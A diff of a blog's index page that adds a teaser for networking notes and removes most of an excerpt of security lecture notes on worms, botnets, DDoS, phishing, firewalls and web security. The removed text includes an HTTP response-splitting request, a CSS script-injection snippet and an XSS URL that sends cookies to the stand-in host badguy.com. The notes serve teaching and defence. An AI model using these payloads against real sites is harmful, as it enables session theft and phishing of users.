@@ -253,6 +253,122 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/07/18/Internet Control Plane Notes/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Jiangfeng Du">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="迷雾">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/07/18/Internet Control Plane Notes/" itemprop="url">Internet Control Plane Notes</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-07-18T09:20:44+02:00">
+                2017-07-18
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <h1 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h1><p>Virtual circuit network<br> Each packet carries tag (virtual circuit ID), tag determines next hop<br> Fixed path determined at call setup time, remains fixed through call<br> Routers maintain per-call state</p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2017/07/18/Internet Control Plane Notes/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/07/10/Internet Security Notes/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -320,576 +436,15 @@
 
       
         
-          
-            <p>Security is about protecting assets. It involves Prevention, Detection, Reaction.</p>
+          <p>Security is about protecting assets. It involves Prevention, Detection, Reaction.</p>
 <p>Confidentiality: prevent unauthorized disclosure of information.<br>Integrity: prevent unauthorized modification of information.<br>Availability: prevent unauthorized withholding of information.</p>
-<h2 id="Worms"><a href="#Worms" class="headerlink" title="Worms"></a>Worms</h2><p>A worm is <em>self-replicating software</em> designed to spread through the network.</p>
-<ul>
-<li>Typically exploits security flaws in widely used services</li>
-<li>Can launch DDOS attacks, install Botnets</li>
-<li>Access sensitive information</li>
-</ul>
-<p>A virus is code embedded in a file or program.</p>
-<p>Viruses and Trojan <code>[&#39;trodʒən]</code>horses rely on human intervention.</p>
-<p>Worms are self-contained.</p>
-<h3 id="The-UCSD-Network-Telescope"><a href="#The-UCSD-Network-Telescope" class="headerlink" title="The UCSD Network Telescope"></a>The UCSD Network Telescope</h3><p>A Real-time Monitoring System for Tracking Internet Attacks</p>
-<p>A way to observe global network phenomena with only local monitoring.</p>
-<p><strong>Since Quantitative attack data isn’t available.</strong></p>
-<p>Key observation: large class of attacks use random addresses.</p>
-<ul>
-<li>Worm’s frequently select new host to infect at random</li>
-<li>Many DoS attacks hide their source by randomizing source addresses.</li>
-</ul>
-<p><strong>Network Telescope</strong></p>
-<ul>
-<li>A monitor that records packets sent to a large range of unused Internet addresses.</li>
-</ul>
-<p>Example: Monitoring Denial-of-Service Attacks</p>
-<ol>
-<li>Attacker floods the victim with requests using <em>random spoofed source IP addresses</em>.</li>
-<li>Victim believes requests are legitimate and responds to each spoofed address.</li>
-<li>Network telescope can infer that <em>a site sending unsolicited reply packets</em> is being attacked.</li>
-</ol>
-<p>We have access to more than 1/256 of all Internet addresses (&gt; 16M IP addresses).</p>
-<p>How do worms propagate?</p>
-<ul>
-<li>Scanning worms (Worm chooses “random” address)</li>
-<li>Coordinated scanning (Different worm instances scan different addresses)</li>
-<li>Flash worms (Preassemble tree of vulnerable hosts, propagate along tree)</li>
-<li>Meta-server worm (Contact server for hosts list(e.g., Google for “powered by phpbb”))</li>
-<li>Topological worm (Use information from infected hosts (web server logs, email address books, config files, SSH “known hosts”))</li>
-<li>Contagion worm (Propagate parasitically along with normal communication)</li>
-</ul>
-<h3 id="Defenses"><a href="#Defenses" class="headerlink" title="Defenses"></a>Defenses</h3><ol>
-<li>Detect via <strong>honeyfarms</strong>: Collections of “<strong>honeypots</strong>” fed by a network telescope.</li>
-</ol>
-<ul>
-<li>Any outbound connection from honeyfarm = worm.</li>
-<li>Distill signature from inbound/outbound traffic.</li>
-</ul>
-<ol>
-<li>Thwart via scan suppressors: network elements that block traffic from hosts that make failed connection attempts to too many other hosts.</li>
-</ol>
-<p>Honeypot</p>
-<blockquote>
-<p>A honeypot is a <em>faked</em> vulnerable system used for the purpose of being attacked, probed, exploited and<br>compromised.</p>
-<p>IDS (Intrusion Detection System)</p>
-</blockquote>
-<p>Classification</p>
-<ul>
-<li>High-interaction honeypots<ul>
-<li>A full and working OS is provided for being attacked</li>
-<li>VMware virtual environment (Several VMware virtual hosts in one physical machine)</li>
-</ul>
-</li>
-<li>Low-interaction honeypots<ul>
-<li>Only emulate specific network services</li>
-<li>No real interaction or OS</li>
-</ul>
-</li>
-<li>Honeynet/honeyfarm (A network of honeypots)<ul>
-<li>Low-interaction honeynet (Emulate a virtual network in one physical machine)</li>
-</ul>
-</li>
-</ul>
-<p>Broader view of defenses</p>
-<p>Prevention – make the monoculture (单一栽培) hardier</p>
-<ul>
-<li>Get the darn code right in the first place</li>
-<li>Lots of active research (static &amp; dynamic methods)</li>
-<li>Security reviews now taken seriously by industry</li>
-</ul>
-<p>Prevention – diversify the monoculture</p>
-<ul>
-<li>Via exploiting existing heterogeneity</li>
-<li>Via creating artificial heterogeneity</li>
-<li>Prevention – keep vulnerabilities inaccessible</li>
-<li>Detection – look for unusual repeated content</li>
-</ul>
-<p>Once you have a live worm, then what?</p>
-<ul>
-<li>Containment<ul>
-<li>Use distilled signature to prevent further spread</li>
-</ul>
-</li>
-<li>Proof of infection<ul>
-<li>Idea: alerts come with a verifiable audit trail that demonstrates the exploit, ala’ proof-carrying code</li>
-</ul>
-</li>
-<li>Auto-patching</li>
-<li>Auto-antiworm<ul>
-<li>Techniques to automatically derive a new worm from a propagating one, but with disinfectant payload.</li>
-</ul>
-</li>
-</ul>
-<h2 id="Botnets"><a href="#Botnets" class="headerlink" title="Botnets"></a>Botnets</h2><p>Botnet could be a most powerful supercomputer in the world.</p>
-<p>Botnet = network of autonomous programs capable of acting on instructions.</p>
-<ul>
-<li>Typically a large (up to several hundred thousand) group of remotely controlled “zombie” systems</li>
-<li>Machine owners are not aware they have been compromised</li>
-<li>Controlled and upgraded via IRC/P2P/HTTP/…</li>
-</ul>
-<p>Used as the platform for various attacks</p>
-<ul>
-<li>Distributed denial of service</li>
-<li>Spam and click fraud</li>
-<li>Launching pad for new exploits/worms</li>
-</ul>
-<h4 id="Botnet-construction"><a href="#Botnet-construction" class="headerlink" title="Botnet construction"></a>Botnet construction</h4><p>First stage, exploit vulnerabilities (operating system’s/browser’s)</p>
-<p>Next stage to download bot software, C&amp;C instructions. (Command and Control)</p>
-<p>Once the bot software is executed and connected to C&amp;C server.</p>
-<ul>
-<li>Bots connect to channel of C&amp;C (IRC or HTTP) password protected channel (IRC: Internet Relay Chat)</li>
-<li>Encryption layer between bot and C&amp;C</li>
-</ul>
-<h4 id="Fast-Flux-service-networks"><a href="#Fast-Flux-service-networks" class="headerlink" title="Fast-Flux service networks"></a>Fast-Flux service networks</h4><ul>
-<li>A technique in which A and NS records of a domain change rapidly</li>
-<li>Location (IP) of the domain changes rapidly when resolved</li>
-<li>Used for load balancing across servers, resource configuration, etc…</li>
-<li>Bot herders effectivly use it to hide mothership</li>
-</ul>
-<h4 id="Propagation"><a href="#Propagation" class="headerlink" title="Propagation"></a>Propagation</h4><p>Each bot can scan IP space for new victims</p>
-<ul>
-<li>Automatically</li>
-<li>On-command: Target specific /8 or /16 prefixes (Botmasters share information about prefixes to avoid).</li>
-</ul>
-<p>DoS</p>
-<p>Goal: Overwhelm victim machine and deny service to its legitimate clients.</p>
-<p>DoS often exploits networking protocols</p>
-<ul>
-<li>Smurf: ICMP echo request to broadcast address with spoofed victim’s address as source</li>
-<li>Ping of death: ICMP packets with payloads greater than 64K crash older versions of Windows</li>
-<li>SYN flood: “Open TCP connection” request from a spoofed address</li>
-<li>UDP flood: Exhaust bandwidth by sending thousands of bogus UDP packets</li>
-</ul>
-<p>DDos</p>
-<p>Build a botnet of zombies</p>
-<p>Command zombies to stage a coordinated attack on the victim</p>
-<ul>
-<li>Does not require spoofing.</li>
-<li>Even in case of SYN flood, SYN cookies don’t help.</li>
-</ul>
-<p>Overwhelm victim with traffic arriving from thousands of different sources.</p>
-<p>DDoS Tools: Trin00</p>
-<p>Send commands (victim IP, attack parameters), using plaintext passwords for authentication</p>
-<ul>
-<li>Attacker to master: TCP, master to zombie: UDP</li>
-</ul>
-<p>DDoS Tools: Tribal Flood Network</p>
-<p>Attacker runs masters directly via root backdoor; masters talk to zombies using ICMP echo reply</p>
-<ul>
-<li>No authentication of master’s commands, but commands are encoded as 16-bit binary numbers inside ICMP packets to prevent accidental triggering</li>
-</ul>
-<p>List of zombie daemons’ IP addresses is encrypted in later versions of TFN master scripts</p>
-<ul>
-<li>Protects identities of zombies if master is discovered</li>
-</ul>
-<p>DDoS Tools: Stacheldraht</p>
-<p>Combines “best” features of Trin00 and TFN</p>
-<p>Symmetric encryption for attacker-master connections.</p>
-<h3 id="Spam"><a href="#Spam" class="headerlink" title="Spam"></a>Spam</h3><h4 id="Email-spoofing"><a href="#Email-spoofing" class="headerlink" title="Email spoofing"></a>Email spoofing</h4><ul>
-<li>Mail is sent via SMTP protocol (No built-in authentication)</li>
-<li>MAIL FROM field is set by the sender</li>
-<li>Recipient’s mail server only sees IP address of the direct peer from whom it received the msg</li>
-</ul>
-<h4 id="Open-relays"><a href="#Open-relays" class="headerlink" title="Open relays"></a>Open relays</h4><p>SMTP relay forwards mail to destination</p>
-<ul>
-<li>Bulk email tool connects via SMTP (port 25)</li>
-<li>Sends list of recipients via RCPT TO command</li>
-<li>Sends email body (once for all recipients!)</li>
-<li>Relay delivers message</li>
-</ul>
-<p>Honest relay adds correct Received: header revealing source IP.</p>
-<p>Hacked relay does not.</p>
-<p>Reason:</p>
-<p>Real-time blackhole lists stop 15-25% of spam at SMTP connection time.</p>
-<ul>
-<li>Over 90% after message body URI checks</li>
-</ul>
-<p>Spammers’ objective: evade blacklists</p>
-<ul>
-<li>Botnets come very handy!</li>
-</ul>
-<p>Spam via Open HTTP proxies.</p>
-<p>Spammer must send message to each recipient through the proxy.</p>
-<h4 id="Detecting-Botnets"><a href="#Detecting-Botnets" class="headerlink" title="Detecting Botnets"></a>Detecting Botnets</h4><p>Today’s bots are controlled via IRC and DNS.</p>
-<ul>
-<li>IRC used to issue commands to zombies</li>
-<li>DNS used by zombies to find the master, and by the master to find if a zombie has been blacklisted</li>
-</ul>
-<p>IRC/DNS activity is very visible in the network</p>
-<ul>
-<li>Look for hosts performing scans, and for IRC channels with a high percentage of such hosts</li>
-<li>Look for hosts who ask many DNS queries, but receive few queries about themselves</li>
-</ul>
-<p>Easily evaded by using encryption and P2P.</p>
-<hr>
-<h3 id="DDoS"><a href="#DDoS" class="headerlink" title="DDoS"></a>DDoS</h3><h4 id="Classic-Denial-of-Service-Attacks"><a href="#Classic-Denial-of-Service-Attacks" class="headerlink" title="Classic Denial of Service Attacks"></a>Classic Denial of Service Attacks</h4><ul>
-<li>can use simple flooding ping</li>
-<li>from higher capacity link to lower</li>
-<li>causing loss of traffic</li>
-<li>source of flood traffic easily identified</li>
-</ul>
-<h4 id="Source-Address-Spoofing"><a href="#Source-Address-Spoofing" class="headerlink" title="Source Address Spoofing"></a>Source Address Spoofing</h4><ul>
-<li>use forged source addresses</li>
-<li>generate large volumes of packets</li>
-<li>cause same congestion</li>
-<li>responses are scattered across Internet</li>
-<li>real source is much harder to identify</li>
-</ul>
-<h4 id="Types-of-Flooding-Attacks"><a href="#Types-of-Flooding-Attacks" class="headerlink" title="Types of Flooding Attacks"></a>Types of Flooding Attacks</h4><p>Classified based on network protocol used</p>
-<ul>
-<li>ICMP Flood (uses ICMP packets, eg echo request) ( typically allowed through, some required)</li>
-<li>UDP Flood (alternative uses UDP packets to some port)</li>
-<li>TCP SYN Flood</li>
-</ul>
-<h4 id="Reflection-Attacks"><a href="#Reflection-Attacks" class="headerlink" title="Reflection Attacks"></a>Reflection Attacks</h4><ul>
-<li>Attacker sends packet with spoofed source address being that of target to a server</li>
-<li>Server response is directed at target</li>
-<li>If send many requests to multiple servers, response can flood target</li>
-<li>ideally want response larger than request</li>
-</ul>
-<p>DNS Amplification Attacks</p>
-<ul>
-<li>use DNS requests with spoofed source address being the target</li>
-<li>exploit DNS behavior to convert a small request to a much larger response (60 byte request to 512 - 4000 byte response)</li>
-<li>attacker sends requests to multiple well connected servers, which flood target</li>
-</ul>
-<h4 id="DoS-Attack-Defenses"><a href="#DoS-Attack-Defenses" class="headerlink" title="DoS Attack Defenses"></a>DoS Attack Defenses</h4><p>three lines of defense against (D)DoS:</p>
-<ul>
-<li>attack prevention and preemption</li>
-<li>attack detection and filtering</li>
-<li>attack source traceback and identification</li>
-</ul>
-<p>Attack Prevention</p>
-<ul>
-<li>block spoofed source addresses (still far too rarely implemented)</li>
-<li>rate controls in upstream distribution nets<ul>
-<li>on specific packets types</li>
-<li>e.g. some ICMP, some UDP, TCP/SYN</li>
-</ul>
-</li>
-<li>use modified TCP connection handling<ul>
-<li>use SYN cookies when table full</li>
-<li>or selective or random drop when table full</li>
-</ul>
-</li>
-<li>block IP directed broadcasts</li>
-<li>block suspicious services &amp; combinations</li>
-<li>manage application attacks with “puzzles” to distinguish legitimate human requests</li>
-<li>use mirrored and replicated servers when high performance and reliability required</li>
-</ul>
-<p>Responding to Attacks</p>
-<ul>
-<li>ideally have network monitors and IDS<ul>
-<li>to detect and notify abnormal traffic patterns</li>
-</ul>
-</li>
-<li>have standard filters</li>
-<li>identify type of attack<ul>
-<li>capture and analyze packets</li>
-<li>design filters to block attack traffic upstream</li>
-<li>or identify and correct system/application bug</li>
-</ul>
-</li>
-<li>have ISP trace packet flow back to source</li>
-</ul>
-<hr>
-<h2 id="Phishing"><a href="#Phishing" class="headerlink" title="Phishing"></a>Phishing</h2><p>Spoofed emails</p>
-<h3 id="Phishing-techniques"><a href="#Phishing-techniques" class="headerlink" title="Phishing techniques"></a>Phishing techniques</h3><ul>
-<li>Use confusing URLs</li>
-<li>Use URL with multiple redirection</li>
-<li>Host phishing sites on botnet zombies<ul>
-<li>Move from bot to bot using dynamic DNS</li>
-</ul>
-</li>
-</ul>
-<p>Pharming</p>
-<ul>
-<li>Poison DNS tables so that victim’s address (e.g., www.paypal.com) points to the phishing site</li>
-<li>URL checking doesn’t help!</li>
-</ul>
-<p>HTTP response splitting</p>
-<p>Malicious user requests</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">http://.../by_lang.jsp ? lang=</div><div class="line">				“french \n</div><div class="line">				Content-length: 0 \r\n\r\n</div><div class="line">				HTTP/1.1 200 OK</div><div class="line">				&lt;Encoded URL of phishing page&gt;”</div></pre></td></tr></table></figure>
-<p>Server responds:</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">HTTP/1.1 302</div><div class="line">Date: …</div><div class="line">` 		Location: /by_lang.jsp ? lang= french</div><div class="line">		Content-length: 0</div><div class="line">		HTTP/1.1 200 OK</div><div class="line">		Content-length: 217  Looks like a separate page</div><div class="line">		Phishing page</div></pre></td></tr></table></figure>
-<p>Attacker submitted a URL to victim.com.</p>
-<p>Response from victim.com contains phishing page.</p>
-<p>All cache servers along the path will store the phishing page as the cache of victim.com.</p>
-<p>If an unsuspecting user of the same cache server requests victim.com, server will give him the cached phishing page instead.</p>
-<h3 id="Trusted-input-path-problem"><a href="#Trusted-input-path-problem" class="headerlink" title="Trusted input path problem"></a>Trusted input path problem</h3><p>Users are easily tricked into entering passwords into insecure non-password fields.</p>
-<p>Sends keystroke to phisher.</p>
-<p>Defense #1: Internet Explorer 7.0</p>
-<p> “White list” of trusted sites</p>
-<p>Defense #2: PassMark / SiteKey</p>
-<p>Defense #3: PIN Guard</p>
-<p>Use your mouse to click the number.</p>
-<p>Defense #3A: Scramble Pad</p>
-<p>Defense #4: Virtual Keyboard</p>
-<p>Passport services</p>
-<p><img src="/image/IS/Passport service.PNG" alt="Passport service"></p>
-<p>Idea: authenticate once, use everywhere.</p>
-<p>Trusted third party issues identity credentials.</p>
-<p>User uses them to access services over the Web.</p>
-<h3 id="Liberty-Alliance"><a href="#Liberty-Alliance" class="headerlink" title="Liberty Alliance"></a>Liberty Alliance</h3><p>Open-standard alternative to Passport</p>
-<p>Promises compliance with privacy legislation</p>
-<p>Long list of Liberty-enabled products</p>
-<p>As of June 2009, work has been transfered to Kantara Initiative.</p>
-<h3 id="Defenses-1"><a href="#Defenses-1" class="headerlink" title="Defenses"></a>Defenses</h3><p>Use mutual authentication</p>
-<p>Non-Reusable credentials</p>
-<p>Basic technical mechanism available</p>
-<hr>
-<h2 id="Spam-analytics"><a href="#Spam-analytics" class="headerlink" title="Spam analytics"></a>Spam analytics</h2><p>Three main cost factors:</p>
-<p>Retail cost to send <em> conversion rate </em> sale profit</p>
-<p>Crucial step: infiltration.</p>
-<h3 id="Mission-Spam-Conversion"><a href="#Mission-Spam-Conversion" class="headerlink" title="Mission: Spam Conversion"></a>Mission: Spam Conversion</h3><p>Infiltrate Storm at proxy level</p>
-<p>rewrite spam instructions to use our own URLs</p>
-<p>… where we run our own websites and observe activity at each stage.</p>
-<p>We get rates for SMTP delivery, spam filtering, click-through, and final conversion.</p>
-<p> Conversion rates:</p>
-<ul>
-<li>1-in-12M for pharmaceuticals</li>
-<li>1-in-200K for voluntary executions</li>
-<li>1-in-10 for website visitors</li>
-</ul>
-<hr>
-<h2 id="Firewalls-and-NAT"><a href="#Firewalls-and-NAT" class="headerlink" title="Firewalls and NAT"></a>Firewalls and NAT</h2><p>Firewalls: isolates organization’s internal net from larger Internet, allowing some packets to pass, blocking others.</p>
-<h3 id="Goals"><a href="#Goals" class="headerlink" title="Goals:"></a>Goals:</h3><ul>
-<li>All traffic from outside to inside and vice-versa passes through the firewall.</li>
-<li>Only authorized traffic, as defined by local security policy, will be allowed to pass.</li>
-<li>Firewall itself is immune to penetration</li>
-</ul>
-<h3 id="Taxonomy"><a href="#Taxonomy" class="headerlink" title="Taxonomy"></a>Taxonomy</h3><ul>
-<li>Traditional packet filters (Filters often combined with router, creating a firewall)</li>
-<li>Stateful filters</li>
-<li>Application gateways</li>
-</ul>
-<p>Firewall == system that filters TCP/IP UDP/IP packets according to rules.</p>
-<p>Either software on user machine or network router.</p>
-<h4 id="Traditional-packet-filters"><a href="#Traditional-packet-filters" class="headerlink" title="Traditional packet filters"></a>Traditional packet filters</h4><p>Analyzes each datagram going through it; makes drop decision based on:</p>
-<p>Src IP addr, Dst IP addr, Src Port, Dst Port, TCP flag bits,</p>
-<p>TCP or UDP or ICMP (Firewalls often configured to block all UDP),</p>
-<p>Direction, Router interface(Decisions can be different for different interfaces).</p>
-<p>Filtering rules (example)</p>
-<p><img src="/image/IS/Filtering Rules.PNG" alt="Filtering Rules"></p>
-<p>Access control lists: (Apply rules from top to bottom)</p>
-<p><img src="/image/IS/Access control list.PNG" alt="Access control list"></p>
-<p>Each router/firewall <strong>interface</strong> can have its own ACL.</p>
-<p>Most firewall vendors provide both command-line and graphical configuration interface.</p>
-<p>Disadvantages:</p>
-<ul>
-<li>Can be penetrated</li>
-<li>Cannot enforce some policies. For example, permit certain users.</li>
-<li>Rules can get complicated and difficult to test</li>
-</ul>
-<p>Iptables - chain types:</p>
-<ul>
-<li>INPUT chain</li>
-<li>OUTPUT chain</li>
-<li>FORWARD chain</li>
-</ul>
-<p>Example command</p>
-<p>iptables –A INPUT –i eth0 –s 232.16.4.0/24 –j ACCEPT</p>
-<p>Append (add rules to the bottom), -interface, -source.</p>
-<h3 id="Stateful-filters"><a href="#Stateful-filters" class="headerlink" title="Stateful filters"></a>Stateful filters</h3><p>Stateless filters: Any packet with ACK=1 and source port 80 gets through.</p>
-<ul>
-<li>Attack with malformed packets: send ACK=1 segments</li>
-</ul>
-<p>Stateful filter: Adds more intelligence to decision-making process.</p>
-<ul>
-<li>Stateful = remember past packets</li>
-<li>Needs very dynamic state table</li>
-</ul>
-<p>Example:</p>
-<p>Log each TCP connection initiated through firewall: SYN segment.</p>
-<p>Rule table indicates check of stateful table:<br>See if there is a connection entry in stateful table</p>
-<p>Stateful filters can remember outgoing UDP segments.</p>
-<h3 id="Application-gateways"><a href="#Application-gateways" class="headerlink" title="Application gateways"></a>Application gateways</h3><p> (aka proxy servers)</p>
-<p>User and server talk through proxy.</p>
-<p>Allows fine grained/ sophisticated control.</p>
-<p>Hinders protocol attacks.</p>
-<p>Example: Local mail servers (Virus detection and removal) and proxy Web servers.</p>
-<p>Advantages:</p>
-<p>Can log all connections, activity in connections</p>
-<p>Can provide caching</p>
-<p>Can do intelligent filtering based on “content”</p>
-<p>Simplifies service control</p>
-<ul>
-<li>Can perform user level authentication</li>
-<li>Simplifies firewall rules</li>
-</ul>
-<p>Disadvantages:</p>
-<p>Not all services have proxied versions (Need different proxy server for each service)</p>
-<p>Requires modification of client</p>
-<p>Performance</p>
-<p>Hinders end-to-end encryption</p>
-<h3 id="IP-traceback"><a href="#IP-traceback" class="headerlink" title="IP traceback"></a>IP traceback</h3><h4 id="Methods-for-finding-source"><a href="#Methods-for-finding-source" class="headerlink" title="Methods for finding source"></a>Methods for finding source</h4><ol>
-<li>Manual using current IP routing.</li>
-</ol>
-<p>Link testing:</p>
-<ul>
-<li>Start from victim and test upstream links</li>
-<li>Recursively repeat until source is located</li>
-<li>Assume attack remains active until trace complete</li>
-</ul>
-<p>Problem:</p>
-<ul>
-<li>Handle ISPs, Located zombie.</li>
-</ul>
-<p>Logging</p>
-<ul>
-<li><p>Key routers log packets (useful for forensics)</p>
-</li>
-<li><p>Use data mining to find path</p>
-</li>
-</ul>
-<ol>
-<li>Automatic using marking algorithms</li>
-</ol>
-<ul>
-<li>Mark packets with router addresses</li>
-<li>Trace attack using marked packets</li>
-</ul>
-<p>Assumption: Route from attacker to victim remains relatively stable.</p>
-<h3 id="Network-address-translation-NAT"><a href="#Network-address-translation-NAT" class="headerlink" title="Network address translation (NAT)"></a>Network address translation (NAT)</h3><p>Also known as Network masquerading, IP masquerading.</p>
-<h4 id="TURN-protocol"><a href="#TURN-protocol" class="headerlink" title="TURN protocol"></a>TURN protocol</h4><p>Traversal Using Relays around NAT</p>
-<p>Protocol for UDP/TCP relaying behind NAT</p>
-<p>Data is bounced to a public TURN server</p>
-<p>No hole punching (Technique to allow traffic from/to a host behind a firewall/NAT without collaboration of the NAT itself)</p>
-<p>TURN works even behind symmetric NAT</p>
-<h4 id="NAT-traversal-Cooperating-NAT"><a href="#NAT-traversal-Cooperating-NAT" class="headerlink" title="NAT traversal: Cooperating NAT"></a>NAT traversal: Cooperating NAT</h4><h5 id="SOCKS"><a href="#SOCKS" class="headerlink" title="SOCKS"></a>SOCKS</h5><p>Client server protocol </p>
-<p>Enables client (behind firewall) to use server (in public Internet)</p>
-<p>Relays traffic</p>
-<p>Widely adopted</p>
-<h4 id="NAT-traversal-UPnP"><a href="#NAT-traversal-UPnP" class="headerlink" title="NAT traversal: UPnP"></a>NAT traversal: UPnP</h4><p>Defines: Internet Gateway Device (IGD) protocol<br>Enables:<br>❍ Learning of ones public (external) IP address<br>❍ Enumeration of existing port mappings<br>❍ Adding and removing port mappings<br>❍ Assigning lease times to mappings<br>❍ Applications to automatically configure NAT routing</p>
-<hr>
-<h2 id="Web-Security"><a href="#Web-Security" class="headerlink" title="Web Security"></a>Web Security</h2><h3 id="Common-Vulnerabilities"><a href="#Common-Vulnerabilities" class="headerlink" title="Common Vulnerabilities"></a>Common Vulnerabilities</h3><p>XSS – Cross-site scripting</p>
-<p>Bad web site sends innocent victim a script that steals information from an honest web site.</p>
-<p>CSRF – Cross-site request forgery</p>
-<p>Bad website sends request to good website, using credentials of an innocent victim who “visits” site.</p>
-<p>SQL Injection</p>
-<p>Browser sends malicious input to server.</p>
-<p>Bad input checking leads to malicious SQL query.</p>
-<h3 id="Cookie-Same-Origin-Policy"><a href="#Cookie-Same-Origin-Policy" class="headerlink" title="Cookie Same Origin Policy"></a>Cookie Same Origin Policy</h3><p>DOM (Document Object Model)</p>
-<p>Web application servers are generally “stateless”.</p>
-<p>Statelessness causes problems for application developers: need to tie together a series of requests from the same user.</p>
-<hr>
-<p>The server creates a unique identifier, and returns a Set-Cookie: header in the response that contains the identifier.</p>
-<p>In the future when the browser connects with the same server, it includes a Cookie:</p>
-<p>header containing the identifier, which the server can use to connect related requests.</p>
-<hr>
-<p>What’s in a cookie?</p>
-<p>Name and data.</p>
-<p>A server can define multiple cookies with different names, but browsers limit the number of cookies per server (around 50).</p>
-<p>Web server maintains a collection of sessions.</p>
-<p>Each session is a pool of data related to an active connection (one browser instance).</p>
-<p>Typically the cookie for an application contains an identifier for a session.</p>
-<hr>
-<p>Today: Same Original Policy (SOP) for cookies:<br>Generally speaking, based on: ([scheme](optional), domain, path)</p>
-<p><code>scheme://domain:port/path?params</code></p>
-<p>Scope setting rules</p>
-<p>Default scope is domain and path of setting URL.</p>
-<p><u>domain</u>: any domain-suffix of URL-hostname, except TLD(Top-level Domain)</p>
-<p>allowed domains: login.site.com, .site.com.</p>
-<p>disallowed domains: user.site.com, othersite.com, .com.</p>
-<p>login.site.com can set cookies for all of .site.com but not for another site or TLD.</p>
-<p><u>path</u>: can be set to anything</p>
-<p>Cookies are identified by <u>(name,domain,path)</u>.</p>
-<hr>
-<p>Reading cookies on server (read SOP)</p>
-<p>GET //URL-domain/URL-path  Cookie: NAME = VALUE</p>
-<p>Browser sends all cookies in URL scope:</p>
-<ul>
-<li>cookie-domain is domain-suffix of URL-domain, and</li>
-<li>cookie-path is prefix of URL-path, and</li>
-<li>[protocol=HTTPS if cookie is “secure”]</li>
-</ul>
-<p>Goal: server only sees cookies in its scope.</p>
-<hr>
-<h4 id="Cookie-protocol-problems"><a href="#Cookie-protocol-problems" class="headerlink" title="Cookie protocol problems"></a>Cookie protocol problems</h4><p>Server is blind:</p>
-<p>Does not see cookie attributes (e.g. secure).<br>Does not see which domain set the cookie.</p>
-<p>Server only sees: Cookie: NAME=VALUE.</p>
-<p>Example 1: login server problems</p>
-<p>Problem: cs142hw expects session-id from login.site.com; <u>cannot tell that session-id cookie was overwritten</u>.</p>
-<p>Example 2: “secure” cookies are not secure</p>
-<p>Alice visits <code>http://www.google.com</code> (cleartext)<br>Network attacker can inject into response.</p>
-<p>​    <em>Set-Cookie: LSID=badguy; secure</em><br>and overwrite secure cookie.</p>
-<p>Problem: network attacker can re-write HTTPS cookies!</p>
-<p>HTTPS cookie value cannot be trusted.</p>
-<p><u>Cookies have no integrity !!</u></p>
-<p>Solution: cryptographic checksums.</p>
-<p>Goal: data integrity.<br>Requires secret key k unknown to browser</p>
-<hr>
-<p>Cookie theft: basic cross site scripting (XSS).</p>
-<p><img src="/image/IS/Reflective XSS attack.PNG" alt="Reflective XSS attack"></p>
-<p>Bad input</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">http://victim.com/search.php ? term =</div><div class="line">&lt;script&gt; window.open(</div><div class="line">“http://badguy.com?cookie = ” +</div><div class="line">document.cookie ) &lt;/script&gt;</div></pre></td></tr></table></figure>
-<p>What if user clicks on this link?</p>
-<ol>
-<li>Browser goes to victim.com/search.php</li>
-<li>Victim.com returns<br><code>&lt;HTML&gt; Results for &lt;script&gt; … &lt;/script&gt;</code></li>
-<li>Browser executes script: Sends badguy.com cookie for victim.com</li>
-</ol>
-<p>An XSS vulnerability is present when an attacker can inject scripting code into pages generated by a web application.</p>
-<p>Methods for injecting malicious code:</p>
-<ul>
-<li>Reflected XSS (“type 1”)<ul>
-<li>the attack script is reflected back to the user as part of a page from the victim site.</li>
-</ul>
-</li>
-<li>Stored XSS (“type 2”)<ul>
-<li>the attacker stores the malicious code in a resource managed by the web application, such as a database.</li>
-</ul>
-</li>
-</ul>
-<p>other ways:</p>
-<ul>
-<li>can do Javascript within CSS tags</li>
-</ul>
-<p><code>&lt;div style=“background:url(‘javascript:alert(1)’)”&gt;</code></p>
-<p>And can hide “javascript” as “java\nscript”.</p>
-<ul>
-<li>Stored XSS using images</li>
-</ul>
-<p>Attacker uploads an “image” that is a script.</p>
-<hr>
-<p>How to Protect Yourself</p>
-<p>The best way to protect against XSS attacks:</p>
-<ul>
-<li>Ensure that your app validates all headers, cookies, query strings, form fields, and hidden fields (i.e., all parameters) against a rigorous specification of what should be allowed.</li>
